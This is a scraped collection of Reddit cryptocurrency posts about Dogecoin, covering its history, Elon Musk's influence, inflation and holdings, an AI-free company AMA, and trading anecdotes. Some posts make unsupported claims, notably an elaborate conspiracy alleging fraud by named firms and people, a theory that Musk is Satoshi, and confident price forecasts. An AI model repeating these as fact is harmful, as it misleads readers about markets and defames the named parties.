It is even more ridiculous reading some comments in the original post and seeing how he emotionally duped a lot of people as if he's some sort of a victim in this whole story, when in the end all he did was stole other people's crypto and financed their own personal ventures with it.",426,2023-09-20 07:58:40,319

More than 10 years ago DOGE got popular as the first meme coin. But there were no exchanges yet, or at least no alt-coin exchanges that would simply feature a lot of coins. At that time, you were able to mine a million DOGE coins per day with a simple GPU rig. As the coin got popular, trading started to happen on the forums of the coin's website - see screenshot.

Doge was actually the start of a meme coin season back in 2013. If you think about it, not much has changed :) . I did a few trade via the forums and it was an experience to say the least. You would get into contact with a random other person and you trade in increments, to make sure no one got scammed. Of course, people would even scam you for small increments. How we dealt with that was to give people on the forum a 'trust-rating'. So people with a good trust rating could (kind of) be trusted.

However, it was clear that with popularity increasing more trading options were needed. So people started to offer themselves as escrows. This worked fine, but again it was clear that this was all quite the hassle. And that was basically when the first 'meme-coin' exchange was born. Someone programmed an exchanged called 'CoinedUp' where you could trade DOGE. It was very ugly, and looked like the design was done in MSPaint. But it worked! Shortly after, other meme coins came out and were added to CoinedUp. Mind you, these exchanged were buggy as well. Nowadays you cannot imagine that if you quickly want to sell something, you just dump it on the 'market'. Back then, that didn't work and people learned the hard way. If you would sell something for 0, it would actually fill a bid from someone that was buying for literally 0.

It was fun. Shorty after that other exchanges started to pop up, quickly becoming more 'professional'. 

For people that joined crypto later and wonder why DOGE has 'value' , well, this is it. It was the first ever meme coin with important history.

DOGE,cryptocurrency,"DOGE pumped 25% and then dumped 13% in just hours on Monday when Twitter erratically changed their logo, causing almost $20 million in both long and short liquidations on Dogecoin alone. Market-wide liquidations of $170M","Dogecoin pumped 25% in a few hours and so far then gave back much of these gains on Monday when Twitter changed their logo to the Dogecoin logo. The rest of the market  has remained largely unchanged during the pump but fell as Dogecoin began to fall as well. It is ridiculous, very questionable and outright dangerous the influence that Elon Musk has.

On **Dogecoin alone**, the market saw liquidations of almost 10 Million on both longs  and shorts, as shorts were liquidated on the way up and longs on the way down. A truly brutal day for dogecoin leverage players. Meanwhile most of the rest of the market, interestingly, just stood by and watched it  all unfold changing little in their gains during the pump but started seeing some red as Dogecoin began to fall in price, though not nearly to the same degree as Dogecoin.

DOGE,cryptocurrency,I Sold all my DogeCoin... and I Don't Regret It,"To make a long story short: I love DogeCoin, but I’m not beholden to it. 

I had 11336 Doge with an initial investment of $876. I then sold it all for $5706.66, a 6x ROI, and roughly $4830 in net profit (not taking into account taxes).

Look, I thought about selling when it was around 70 cents but didn’t. I wanted to see that sweet Dolla Dolla Bill, Y’all. 

But it didn’t happen. In fact, it crashed after SNL, and has been overall, going downhill ever since (at least until this afternoon [Monday]).

I gave it a day to see if it’d recover, (Sunday) but it’s only got worse. 

Could it go up? Of course. But I sold at a an awesome profit. 

So I sold at around 50 cents this morning.

Once the money clears, I’m going to take that money and reinvest it into some cryptos I can make interest on like ETH. MORE stable stuff; although of course everything is volatile. 

My point here is this: Although I like the investment, to me, it’s nothing more than just that, an investment. A vessel to profit. 

I see many looking at Doge with the same mentality as the WSB crew and GME: “HODL the line!”

I think this is dangerous thinking if you’re not mentally prepared to wait out that risk and possibly lose it all. 

It’s also dangerous to allow greed to dictate decisions. It can cause you to miss great opportunities for profit. I wanted a dollar but had already planned on selling at .50 if it didn’t reach it.

So I did. And I’m okay with that. 

Another user once posted this sentence: “No one ever lost money taking a profit.”

I’ve taken that phrase to heart. I’m trying to balance possible profit against risking loss. And I’m okay not making the extra money, because I came out ahead. 

For those still in Doge, I really, really hope it goes to the moon. I wish everyone on these subs financial prosperity if it puts them in a better place. 

But don’t stay in just because others are telling you to. Stay in if you have the serious conviction to do so and have an exit plan. 

TL;dr: I sold my Doge for a 6x profit, and recommend others only hold if they have the risk tolerance to do so and not because other people are telling them to.

previous #1 wallet [can be found here]( https://bitinfocharts.com/dogecoin/address/DH5yaieqoZN36fDVciNyRueRGvGLR3mr7L) but has since been divided into other wallets.

The transaction itself [can be found here](https://dogechain.info/tx/363575415cd19e0540cdd2a79fca0928f60990206d6e2c3764031d056e3cfd0e). 

———————-

__What you should know:__

[5 of the current top 17 wallets owning roughly 30%](https://www.reddit.com/r/dogecoindev/comments/qj2ee1/comment/hinzjux/?utm_source=share&utm_medium=web2x&context=3) of Doge are now confirmed to be RH through various Cold/Hot storage wallets that are linked together.

The prior #1 had not sent any doge since 04/12/21 when the price was $.07 back in April. On 10/29/21 this (cold wallet) woke up and began sending Doge around to difference wallets - most was sent to a new #1 hot wallet with regular ins/outs. Just in time for the soon to be released RH Alpha wallets released

(Additionally the current number 5 wallet is a burn wallet and own 1.41% of Doge.)

If we count the top 17 unknown wallets, they own roughly 18.75% of the Doge in existence (which again likely includes other exchanges). A far cry from the 43.7% that gets thrown around if you count the known RH wallets/burn wallet.

——————-

I’ve wrote on Reddit a few times about this wallet but this is the first time a RH Alpha transaction can be traced back to that old wallet and provide further evidence its RH holding roughly 30% of Doge in existence on behalf of their users. (Rh had previously stated they didn’t own a sizable amount of any coin on their platform. Which could be true and just be semantics - they could still hold a sizable amount on behalf of their clients.)

Previous posts about this situation but didn’t have this additional proof.

Number 3 on this post [A few reasons why Doge is misunderstood and has better Tokenomics than you thought.](https://www.reddit.com/r/CryptoCurrency/comments/qtacz9/a_few_reasons_why_doge_is_misunderstood_and_has/)

a comment on [this thread summarized everything that was known up to that point with further links](https://np.reddit.com/r/dogecoin/comments/qj7rrx/comment/hioa97q/) but will be slightly out of date.

The only thing this lacks is a confirmation from RH but exchanges are notorious at not identifying their wallets.

DOGE,cryptocurrency,"I've been shorting BTC since $60k and Doge since $0.70c, here is where i think the market is going, where it is and why it fell","Ooof okay lets get started.

**My current positions and why the market fell**

Call it magic, call it astrology, call it fugazi or call it dumb.

But IMO Technical Analysis has and will always work 100% **IF** you know exactly where to look.

Since, February i have been calling the downfall of Bitcoin while everyone was saying we were going to continue or rise to $100k based off on two very simple indicators

The first is one i have created myself known as the Reverse MACD, where i have essentially built it to let me know when i should SELL as opposed to buy (i wont go into the details of this because this isnt what the post is about)

and the second is the very simple indicator known as the Stochastic which basically shows you overbought or sold momentum.

Essentially what i did was have my eye on the MONTHLY chart of bitcoin.

Ever since the beginning of the year the Rev MACD was showing me HUGE signs of weakening power on the bullish side for BTC, immediate red flag telling me to keep an eye on the price at the range of $60k

it kept its price around that level for some weeks and after realizing that we were not breaking ATHs and bullish momentum on the Rev MACD was weakening and the stochastic was creating clear tops, i decided to pull the trigger back in February and open my short position on Forex

ive been holding since

Doge is basically the same story but i noticed that Elon Musks tweets were highly inefficient in the last couple of weeks/months since bitcoin started falling

after seeing how much the price dropped in recent weeks compared to bitcoins i knew that Doges drop was going to be glorious, of course unless Elon Musk Tweeted.


**Where i think the Market is going**

Lets keep this very simple, i do think that Bitcoin is HIGHLY likely to retouch 2017 highs of ~$20,000. Im just going to say that right now.

Reason being is, i still think crypto is early and there is no big financial institutional support for bitcoin

**People who keep saying ""BUT ITS TOO BIG TO DROP,  THERE TOO MUCH INSTITUTIONAL SUPPORT NOW"" yall need to stop right now.**

Bitcoin is definitely NOT supported in a big way unless i can easily buy a Big Mac at McDonalds or my Coffee at starbucks without it affecting the normality of everyday transactions

essentially what i mean by this is, if starbucks and McDonalds are openly okay with accepting crypto.

So back to my original thought, Bitcoin as of right now has some REALLY nice support around $32,000 but as soon as alts start deterring Bitcoin is going to drop straight to $26,000 and just keep falling from there

BUT rawrtherapy are you telling me that were done for?

Not necessarily, i DO think that in order for Bitcoin to stay in this downtrend that we need to have June and July close bearish for confirmation, if either of these months end up closing bullish then I 100% think that we are rallying back to $60,000+

**What about alts rawrtherapy? Will those recover?**

I am going to be buying Alts HEAVY as soon as there is any indication on Bitcoin closing bullish on any month going from now on, so far we have been bearish on Bitcoin for two months and June being the critical 3rd month (let me explain why)

Historically Bitcoin only drops in two sets of ways

We either see a 40-50% Correction in 90 days

OR

We see a full Bitcoin correction of 70-80% in 250+ days

There are around 4-5-6 historical drops like this, all being relative to each other on the monthly drops of ATHs down to lows of when bearish momentum was weakening

This is what i am basing my thesis on for Bitcoins current drop.

The importance of June closing bearish is it will be the all tell if BTC will stay bearish and has completed Phase 1 of the bear cycle

Phase 2 is closing the 4th month bearish indicating a FULL bear market that will last another 160+ days

otherwise, if July closes Bullish that is the indication that BTC will no longer be in bear territory and is primed to do a 3x from whatever lows the Phase 1 bear cycle created

Historicall Bitcoins at MINIMUM rallies 3 times dependent on its bear cycle lows.

For example the lowest low weve seen in this Phase 1 Bear Cycle is roughly $30,000 that gives me $90,000 Price Target on an average 200+ days after the low was created

so if we created that low last month on May 15, then expect a 3x from bitcoin from that date + 200+ days

**Where we are in the Market right now**

I think right now we are at the most crucial price for Bitcoin. June is in theory one of the most important months in this Phase 1 Bear Cycle, we can either stay bearish and close this month on a continued down trend that will then lead to July being the catalyst or we can recover this month (unlikely) by shooting up like crazy and evidently close June bullish (again which i dont think will happen).

Because i am 99% sure that Bitcoin WILL indeed close bearish for the month of June this leaves July as the MOST important month for Bitcoin, which can either start the rally IMO minimum to $90,000 or we can see a much further drop down to $20,000.

July is the most import month for Bitcoin hands down and it is and will be the month catalyst for Bitcoins rise or fall.

**TL;DR**: July needs to close bullish for Bitcoin to see $90,000. If July closes bearish then we will see a $20,000 Bitcoin again and expect to be in a bear market for 200+ more days from now.

**Note** If July closes bullish on Bitcoin i will start buying heavy into Alts. As i do think with Doge dying that retail money will flow into Alts the correct way instead of just going into one Crypto.

**TL;DR 2: Jesus i didnt think this was gonna be an issue but i literally tell you guys what i think is going to happen.**

**July closes Bearish, $20,000 and under in 250+ days**

**July closes Bullish, $90,000 in 200 days, roughly from July's end**

Edit; So im not one for self promotion but here's all the proof, literally in video and dates of upload: **https://www.youtube.com/channel/UCfsjoc_1Q9ue1pL0BpehqmQ**

**For those of you that are interested i will be creating a new post on June 30th updating everyone**

i will also be creating another post on July 31st letting everyone know if BTC cwill be closing bearish or bullish for the month of July 2021",385,2021-06-21 19:23:11,430

i mean, is it even going to pass thru the exchanges where we could get a stab at this,  or is someone playing with a trillion dollars and can just bend its price to their will. 


they’re both pretty high now… just wait a bit, sell a little, pickup a little in the dips and hope ?   

my btc will be theee for a long time… but doge…. is elon going to make doge some official coin, and it becomes #2 or even replaces bitcoin?  

i know its decentralized,   but they’ve got money powers .. like exponential amounts money than us.    


If DOGE becomes a coin every dick and jane know about, it’s gonna be in a 2-3$ range soon… and it’ll be tied to the lying presentations elon will put on like he does or did for previous things he’s done.  

i dunno. i’m trailing off


i think btc and doge will be the only two to break into the middle class family this bull run,  and the next one people will spend more on what the coin does and the culture etc.

DOGE,cryptocurrency,Reasons Why Some Believe Elon Musk Could Be Satoshi Nakamoto and Doge could have a big part!," After my previous post sparked debate, I want to focus on more reasons supporting the theory that Elon Musk could be Satoshi Nakamoto and Ðoge could in return, have something to do with it. 


1. Background in Computer Science and Technology:   Elon Musk's early ventures, such as Zip2 and X.com, demonstrate his technical expertise relevant to Bitcoin's development.

2. Interest in Cryptography:   Musk's involvement in encryption and security through projects like X, SpaceX and Tesla highlights his knowledge in cryptography, a key aspect of Bitcoin.

3. Early Interest in Digital Payments:   Musk's role in the founding of X.com and PayPal shows his early recognition of the potential of digital payments and cryptocurrencies.

4. Programming Language and Code Similarities:    Bitcoin's code is written in C++, a programming language known for its efficiency and versatility. Elon Musk's ventures, including SpaceX and Tesla, also utilize C++ in their software development, highlighting a shared technical preference.

5. Similar Text Style:   Both Elon Musk and Satoshi Nakamoto have a distinctive and often cryptic writing style. Their communication is concise, technical, and direct.

6. Advocacy for Transparency, Openness, and Global Perspective:   Elon Musk has been a vocal advocate for transparency and open communication, which are also principles valued by the Bitcoin community. His support for open source technology and collaboration aligns with the ethos of Bitcoin's open development process. Similarly, his companies, including ""X"" (Twitter), also emphasize openness and transparency in their operations and communication, reflecting a shared commitment to these principles across his ventures. Additionally, both Elon Musk and the Bitcoin community have a global perspective, aiming to create solutions that benefit people worldwide and transcend geographical boundaries.

7. Timely Involvement with Ðogecoin:   Elon Musk's notable involvement with Ðogecoin, particularly his tweets and endorsements, coincided with significant events in the cryptocurrency world. His support for Ðogecoin leading up to the Bitcoin halving and the date 4/20, known as DogeDay in the community, suggests a strategic and timely interest in the crypto space. This timing has led some to speculate about a potential connection between Elon Musk and the broader cryptocurrency ecosystem, including Bitcoin.

8. Potential Role of Ðogecoin:   If Elon Musk were Satoshi Nakamoto, Ðogecoin could play a significant role in promoting generosity and doing good. A coin that strives for ""doing only good everyday"" could encourage a more positive and generous world.


 It's worth noting that my previous post received a lot of hate, which raises questions about the negativity some people harbor towards innovative ideas and possibilities. The strong negative reactions emphasize the need for a more welcoming and positive cryptocurrency community, making Ðogecoin's ethos of kindness and generosity even more relevant and necessary.

DOGE,cryptocurrency,Brace yourselves. People who think they can become millionaires with 1k investment are coming.,"You feel it in the air. As soon as bitcoin reaches mainstream news due to high price, they are coming here. Newcomers, who have their first surplus after all the bills are paid and now think that crypto will go up 15% a week for another year or so.

""The math is easy! 15% a week for 52 weeks and my 1000 bucks will become almost 1,5 million!"" A flawless conclusion after extrapolating the (very recent) data.

But this is only the fist stage! The second stage:

""I invested after bitcoin shoot up 15% and now I am down 10%! How could that be? It is over and I need to sell!"" A sensible reaction after buying a volatile asset that was very overbought. But don't worry, they will be back next day after buying in again and losing a part of the initial investment for no reason.

Now comes the third stage:

""I did the math again and realized that I will become a millionaire much quicker if a invest in this new CumElonDoge coin that I see everywhere. It quadrupled in a day so I will buy today and will be a carefree person in less than a week!"" A logical conclusion. Nothing with ""Elon"" in its name can go wrong! If you think otherwise, go fuck yourself!

If we are lucky, we could stop some of those people, but on the other hand... It is kinda fun seeing this level of idiocy but not being the idiot anymore. So maybe, sometimes, you could just say ""you go man! chase your dreams!"" and see what happens.",3200,2023-12-08 23:29:24,1000

DOGE,cryptocurrency,"If you agree with every ""DOGE is dead because it's down from ATH"" posts, you are no different than those writing ""BTC is dead"" every time it dips","**Disclaimer because it's necessary on this sub: I hold BTC. I don't hold DOGE. This is not a pro DOGE post, this is not an anti BTC post. Don't try to make it either.**

Most of you [make fun of people if they declare Bitcoin dead](https://np.reddit.com/r/CryptoCurrency/comments/rhwipq/bitcoin_has_died_435_times_so_far/) if it dips a bit and you're right to do so. Those boomers, huh? Don't even notice that BTC has always survived after they declared it dead. I'm on your side on this (even though not every article saying ""BTC might continue dipping"" is declaring it dead, as some seem to interpret it).

Can't you see how many of you are kinda doing the same to DOGE? DOGE has been around for 8 years now, the first mention of it being dead that I've found was from [three weeks after its initial launch in 2013](http://animalnewyork.com/dogecoin-dead-killed/). It also died in [2014](https://www.dailydot.com/debug/moolah-dogecoin-alex-green/), [2017](https://coinanalysis.io/dogecoin/), [2018](https://www.1kosmos.com/blockchain/thousands-of-crypto-coins-dead-these-are-top-5/), [2020](https://greeneryfinancial.com/is-dogecoin-dead/)... and I only looked for like 3 minutes. DOGEs ATH before 2021 was at about $0.0175. So this dead coin reached a new ATH more than 4,000% above its previous ATH this year.

And still, a week ago a post saying that [DOGE is dead because it currently is down](https://np.reddit.com/r/CryptoCurrency/comments/rbzj8t/is_it_time_to_finally_admit_that_doge_likely_has/) when, in fact, the whole market is down and DOGE's performance was very average compared to other top 100 coins got almost 8,000 upvotes. Today, an [almost identical post](https://np.reddit.com/r/CryptoCurrency/comments/rigzgt/dogecoin_holders_when_are_we_going_to_admit_weve/) providing nothing more got over 1,000 upvotes before OP deleted it for some reason ^I’m  ^sure  ^it  ^was  ^not  ^at  ^all  ^because  ^it  ^already  ^had  ^reached  ^1,000  ^upvotes  ^which  ^is  ^the  ^maximum  ^for  ^moon  ^farming  ^and  ^he  ^was  ^afraid  ^that  ^mods  ^would  ^delete  ^his  ^post ^because ^it ^was ^basically ^a ^copy ^of ^the ^other ^one,  ^which  ^would  ^lead  ^to  ^0  ^moon  ^karma

Don't you see how ridiculous this is? I'm not saying you should like DOGE at all, I'm not saying there aren't enough reasons to criticize it, but you are taking an 'argument' (coin down = coin dead) that you would never, ever accept for any coin you like or are neutral about, at face value and act the same way as those people you call ""Bitcoin-haters"" and ""no-coiners"" do if BTC dips.

I don't have any DOGE and don't plan on buying any. I have no idea if it will ever surpass its previous ATH. But if I *had* to name three coins that I think are most likely to still be around and in the top 100 in 10 years I'd say BTC, ETH, surviving all those 'ETH-killers', and yes, DOGE. That dog has survived so many deaths, it won't be easy to kill him.

**tl;dr: BTC has died a million times, so has DOGE. Why are you making fun of those saying it about BTC but supporting those saying it about DOGE?**

Edit: everyone being like ""you can't compare those, BTC is technically superior"": I would ask all of you to explain why. If you can't, you should not say that.",87,2021-12-17 18:46:13,481
DOGE,cryptocurrency,Do you think the future of Doge is tied to what happens with Elon?,"This topic is an idea I thought might be fun to discuss regardless of if you think Doge is the best thing since sliced bread or the worst thing to happen to crypto. 

Doge has had a strange trajectory and while it has down slid from the top 5 cryptos, it is still in the top 10 as of this post anyway.

I started to theorize that Elons messy dealings like he's been having with Twitter may have some tie to Doges relatively dwindled popularity.

So that's made me wonder if say for example Twitter went bankrupt, does that effect Doge or does the crypto/meme community not care.

To be clear this thread isn't praising anyone or any crypto just kind of a market speculation curiosity,  considering doge still ranks up there. 

What do you think?

Cryptocurrency is a good idea on many levels and we believe it has a promising future, but this cannot come at a great cost to the environment.

DOGE,cryptocurrency,"[AMA & Giveaway] We're Doge Labs - the primary infrastructure provider for Dogecoin Ordinals (Doginals). Ask us about Ordinals, Dogecoin, or both! EVERY question asked wins a unique Dogecoin Identity PFP on Doginals.","Hi r/CryptoCurrency,

This is Chris, co-founder of Doge Labs. We are the primary infrastructure provider within the Dogecoin Ordinals (aka 'Doginals') ecosystem.

Doge Labs established the first token standard on Dogecoin, as well as launched the first-ever [fully automated market](https://drc-20.org/) on DOGE through a technical breakthrough we call PSDTs (partially signed Dogecoin transactions).

https://preview.redd.it/bv0nxpokltxb1.jpg?width=1500&format=pjpg&auto=webp&s=9a693ec12531f4d1cb2c036f28b6efe8bd9399a9

I've been a member of r/CC since 2018 - so I'm really excited to do this. Ask Me Anything about Dogecoin, Ordinals, Doginals, or... well, anything else!

**But first, maybe some background...**

&#x200B;

# What are Ordinals?

***To over-simplify things:***

* Ordinals are a means of creating NFTs by attaching data (texts, images, videos, etc.) to an atomic unit (satoshi for Bitcoin, shibe for Dogecoin) on the base blockchain.
* There are no links to external platforms required, no external hosting for images needed, etc. It's all handled natively on-chain.
* By indexing - or numbering - every shibe/satoshi mined from each block, the data upon them becomes trackable and thus allows it to be stored, kept, and traded.
* ""Inscriptions"" are the contents of an ordinal NFT itself, which can be images, texts, videos, etc. We call them ""Shibescriptions"" on Doge.

&#x200B;

# So what are these Doginal things?

Dogecoin Ordinals, or 'Doginals', are a brand new functionality and utility for Dogecoin.

They enable users to write (inscribe) information that is stored on the smallest individual units of a Dogecoin (aka 'shibes').

&#x200B;

>Simply put: **Doginals are crypto assets on Dogecoin.**

&#x200B;

You might recall a [few](https://cointelegraph.com/news/ordinals-sends-ltc-and-doge-network-activity-surging-for-3-straight-weeks) [headlines](https://www.theblock.co/post/231128/tokens-built-on-dogecoin-results-in-all-time-high-in-daily-transactions?utm_source=coinmarketcap&utm_medium=rss) [regarding](https://finance.yahoo.com/news/dogecoin-activity-surges-ordinals-core-170700350.html?guccounter=1&guce_=) [transactions](https://www.fxstreet.com/cryptocurrencies/news/dogecoin-overtakes-bitcoin-in-daily-transactions-as-drc-20-capitalizes-on-ordinals-hype-202305190054) on [Doge](https://watcher.guru/news/drc-20-tokens-dogecoin-passing-trend-overwhelming-the-network) surpassing Bitcoin and Ethereum's ***combined*** back in May/June of this year. Well, that wasn't just happenstance...

https://preview.redd.it/m7rfd61dltxb1.png?width=1227&format=png&auto=webp&s=725143e6c66ea19dc6ce59d3327e15964c09dfcb

This coincided with the first easily-accessible release of Dogecoin Ordinals, and the ***overwhelming majority*** of this volume was made of individuals deploying, minting, and sending inscriptions.

Due to the characteristics of DOGE as a blockchain (cheap fees mixed with quick transaction times), users could experiment with creating and minting tokens and NFTs for fractions of a penny, on scales never really done before - certainly not entirely on-chain, at least.

In fact, even as far back as August, Doginals have had far more inscriptions than Bitcoin Ordinals, Litecoin Ordinals, Ethscriptions, and Bitcoin Stamps - ***combined***.

&#x200B;

https://i.redd.it/5xuocxzomtxb1.gif

We like to think of Doginals as a kind of sandbox for Ordinal and on-chain NFT development, as the parameters for getting involved and innovating offer such a low barrier to entry.

The ecosystem itself is still incredibly new, and major players are just beginning to emerge. Because of the incredibly friendly cost, there are all sorts of people trying out new types and concepts of collections on the daily.

On the token side of things (drc-20), $DOGI has come out as a clear frontrunning favorite, as we just witnessed it surpassing 1,500,000 DOGE in trading volume. If you're familiar with Ordinals, $DOGI is basically $ORDI, but on Dogecoin (first token inscribed, 21 million supply, etc.). But even then, the drc-20 landscape is also young with many tokens attempting to establish their footing.

While Doginals (might) sound pretty cool 😎, nothing comes without drawbacks - including many of the same arguments some people voice against Bitcoin's Ordinals and brc20.

If you're new to this space, an old hat, or just a skeptic, I'd love to hear any questions you might have.

* How do I get started?
* What's the catch?
* Are these bad for the environment?
* Is this really all on Dogecoin?
* I still don't get it? What are these?

I take all questions in good faith, and would love to discuss even some of the more difficult topics if you're willing to have a discussion with me. 😄

Thanks for reading, and congrats for surviving this bear market thus far. I'm personally more bullish than ever on crypto as a whole, but I remember the aftermath of 2017/2018 and commend you all for sticking around.

DOGE,cryptocurrency,"Unpopular opinion: DOGE is fun, but is actively delegitimizing the crypto space","Let me preface this by saying I have made bank off DOGE (bought 925k at \~0.023, check my last post) and that I love the memes and the community.

As you all probably know, DOGE has now hit the mainstream media big-time and is making waves in the financial space, drawing in new faces by the thousands. This is fun and all, but I'm worried it's detrimental to the overall health of the cryptocurrency space, and might also have something to do with the correction we're currently in.

For most of you regulars in here, DOGE is simply a meme that is fun to trade, but for a lot of people, DOGE is a genuine investment. I have already had discussions with several people about the potential price targets for DOGE, where they're trying to make the case for a $100 price target, which even long-term is extremely unlikely. Other people that are new to crypto in facebook groups genuinely ask what we think about DOGE as a long-term investment, like they would for BTC, ETH and other solid projects. [Here](https://imgur.com/a/KYvEOmi)'s an example of someone genuinely believing the technology behind DOGE is ""fantastic"". People are risking their family savings investing in DOGE, not knowing it's likely to dump once the hype staves off. 

Presumably most here would know that DOGE has no maximum supply or halving mechanism, so it'll keep printing coins into infinity, essentially reducing the value of the coins held by hodlers as soon as the demand lowers. It has no inherent value beyond its memes and community, and so for long-time traders seeing that DOGE is still rallying while everything else is dropping, is creating major uncertainty. Additionally, various celebrities are actively tweeting about DOGE, skyrocketing its price, rendering technical analysis completely obsolete. How are you supposed to make good buys if fundamentals and technical analysis no longer matters? 

Also, at this point, [one single hodler currently sits on 28,72% of all DOGE in circulation](https://www.coinexplorer.net/DOGE/richlist). The top 16 bagholders have over 50% of all DOGE. That is an issue. 

Make of this what you will, but for me, I think that this is a major issue that we need to address. I want cryptocurrencies to succeed as they're precisely what we need in the world right now. As opposed to Robinhood, cryptocurrencies *actually* democratize finance, and thus the world, so it's extremely important we do our best to make sure cryptocurrencies are taken seriously.",599,2021-02-07 19:06:21,136
DOGE,cryptocurrency,Elon Musk Is Not One Of Us. Stop Using Him As a Role Model.,"I’m tired of seeing him as a face of crypto in news. He is not one of us. He isn’t your average Joe. He is multi billionaire, one of the richest guys in the world. He doesn’t care about you, about me, about mine or your family. All he cares it’s his ego and his companies.

Lately, we’ve seen a lot of hate towards Mark Zuckerberg from Facebook. Is sweet Elon Musk different? Maybe he isn’t lizardy as Marky is, because he is skrull from Mars. Is Elon any different compared to Mark? Both of them are shilling their own companies, Tesla isn’t different. Just because he offers you to buy Tesla with BTC, it doesn’t mean that he is on your side. He isn’t helping you, he is helping himself. 

While you’re laughing at him shilling DOGE, he is laughing at you how is he manipulating you. He is not helping crypto, he is hurting it. He isn’t same as you or me, he doesn’t have to save money for food, he doesn’t have the count if he has enough for dinner. 

He isn’t on your side, every one of the billionaires are trying to manipulate as much people as they can, to make them believe in theirs own visions and dreams. Just because he pumped your coin, it doesn’t mean that he is your lovely neighbour. 

Elon shouldn’t be used as a model for crypto. Just because he was on Joe Rogan podcast, it isn’t making him a proper role model.

DOGE,cryptocurrency,"Nasty FTX backdoor dealings involving AMC stock, Doge and LedgerX","This is a cross-post from robotwizard_9009...

I have evidence that Robinhood, w/ Jump Trading, tokenized our stonks with FTX for Melvin

Firstly, it's important to know that Jump Trading is the crypto arm of RH and the largest holder of dogecoin..

Jan 25th 2021 : Citadel and Point72 give Melvin Capital $2.5b

Jan 26th, FTX tokenized our stonks onto Solana and Wrapped Eth with Jump Trading and Binance.

Jan 27th, Melvin ""closes"" their positions.. or.. hedges on FTX with up to 100x leverage.

Jan 28th, Blockfolio(owned by FTX) tokenized yet another copy of our stonks on eth, into bridges across the crypto landscape. One of those bridges is RenDoge.

Doge pumps and media declares doge a ""memecoin"". I'll say it right now, there was no such thing as ""memecoins""

Our stonks now exist in 4 places.. out tradfi, and at least 3 mirrors in crypto. The price crashes and Melvin makes a killing on an overlevered short position.

Feb 1st, Elon Musk calls Vlad

Feb 2nd, FTX officially partners with Ren Bridge.

Dogecoin was never a ""memecoin"".. there's no such thing as ""memecoins""

Dogecoin is inneffecient. Later, SBF is suspected to be the creator of shibu inu.  I suspect he made Floki for Elon as well. These were laundry devices. I suspect the end client was XRP Ripple. The official partner of the World Economic Forum, which Ken Griffin sits on the board. It has recently come to my attention that XRP gave FTX over $10m .. and are claiming FTX owes them $93m.

XRP is now looking at purchasing FTX assets. Whether that be tokenized stonks.. or I suspect, LedgerX. LedgerX is the only approved perpetual swaps in the USA. Approved by Heath Tarbert, previous admin appointed CFTC chair who joined Citadel less than 27 days of leaving CFTC. He's now Citadels Cheif Legal Advisor. Not only did he approve LedgerX, but he rolled back gary genslers clause in the Dodd Frank Act for foreign swaps reporting. Tarberts signature can be found on a foreign swaps with FTX in mid 2021.

LedgerX was close door auctioned last week by Sullivan and Cromwell, who shouldn't be allowed to manage FTX due to conflicts. Who bought LedgerX?

To top it off, Metaplex is a combo of Citadel and Jump Trading personel. They minted Degenerate Apes. A rip off of the memestock ape community. Highly suspicious. All of this. I suspect Michael Jordan is the secret VC behind Metaplex and was rumored to sell his NBA franchise to Melvin. He lost over $500m in the memestock event. He just auctioned a pair of Nike last week for $2m..

Melvin just came back from the dead to be a clearing firm starting last monday.Monday.. the day before the LedgerX auction.

Jump Trading was involved in the Terra Luna, Mirror Protocol fraud. This was centered around mAssets or Mirrored securities. These were tokenized stock products. Specifically.. tokenized memestocks.  This was not only securities fraud, but wirefraud and laundering.

Another suspect is LayerZero, whom SBF gave $30m. LayerZero came up with technology that puts smart contracts into basic messages. Once an asset is held in perpetuity, whether on eth, Solana or ledgerX perp swaps... they can mint an infinite supply of mirrors on any connected or bridged chain. This can directly or indirectly manipulate the underlying. They also coded a backdoor for their clients. This involves andreeson horowitz, a16z, point72 and citadel.

This is bigger than anyone knows.

Oh yea.. I also recently caught Citadel acting as a searcher and validator on the Solana blockchain. Jump trading runs Pyth, an oracle system. Jump and citadel are validating trades on solana and attacking the system with MEV bots to frontrun orders and do order packing. If you are validating trades and providing oracle price feeds, this can directly manipulate prices. Pyth is also specifically designed to allow bogus feeds without disrupting the system. Some data providers were showing our stonks a few thousand dollars away from base, or Trading at 0.  Tick tock.. apes aren't leaving.

Mismarked short positions are hidden in swaps. They used crypto and swaps to hide from regulators and authorities. DERIBIT handles %100 of solana options and %97 of btc and eth. Paradigm clears those trades. In an interview. Ken griffin talks about how evil crypto is. Less than 2 months later, he's partnering over $1.15b with Paradigm and Sequoia.

DOGE,cryptocurrency,Elon Musk Just Embarrassed Himself In Front Of Crypto Twitter,"[Elon Musk Tweet](https://ibb.co/dBSg5ps)

On the Night of May 15th, a Twitter profile tweeted Doge Coin is the chosen one by Elon Musk because of its lower fees and less environmental effect.

Elon Musk replies that he wants to speed up Block time 10X and increase Block size 10X to reduce transaction fee 100X, for Doge Coin. 

If the solution of blockchain scaling was simply to change the variables, why Adam Beck didn't think of this and why Satoshi didn't think of this.

Even now projects like Ethereum can increase the limit and make transaction fees on the chain reduce over 1000X.

THE SOLUTION IS NOT TO JUST CHANGE NUMBERS.

It seriously has a bad effects on the network security and decentralization. (Please remember this)

Many projects like BCH and BSV has tried all this. And failed.

This narrative is so 2013.

Bitcoin has proven itself again and again over the years on why it is the King. And projects like Ethereum are working for years to scale in this perspective. 

If you are new to crypto, please do not get manipulated by Elon Musk's tweets. 

IMO, Doge Coin is just a tool for Elon to flex his dominance around this space. It won't last long as he clearly has no clue what he is talking about.",16838,2021-05-16 02:22:21,3525

DOGE,cryptocurrency,How Truly Bad Is DOGE's Infinite Inflation And Tokenomics? Let's Look,"I know we love to bash Doge here, and I'm with that. I'm *not* a fan of the coin and don't recommend it to people. HOWEVER, it is important to get every side of an argument, so I hope to take the infinite inflation argument and put it to the test.

Really how bad is Doge's infinite inflation?

Dogecoin is mined at a rate of **10,000 DOGE per minute**, which results in **14,400,000 DOGE** created **per day**. **Yearly, 5,256,000,000** Coins are added to the supply. Though this looks like a massive number, how does it compare to Doge's current Circulating Supply?

Doge right now rounded up has a circulating supply of **131 Billion DOGE**. If we were to add these newly minted coins (making the **circulating supply 136,256,000,000**), **3.85% DOGE** is added to the supply in a years time. Because there will always be **10,000 DOGE** added per minute, the % rate of new Doge created will continuously go down. So how about the years that follow?

* **2021-2022 - 3.85%**
* **2022-2023 - 3.71%**
* **2023-2024 - 3.58%**
* **2024-2025 - 3.45%**
* **2025-2026 - 3.34%**
* **2026-2027 - 3.23%**
* **2027-2028 - 3.13%**
* **2028-2029 - 3.03%**

In 8 years, we will see Doge very slowly drop to around 3% inflation, and will continue to lower as long as it uses this system.

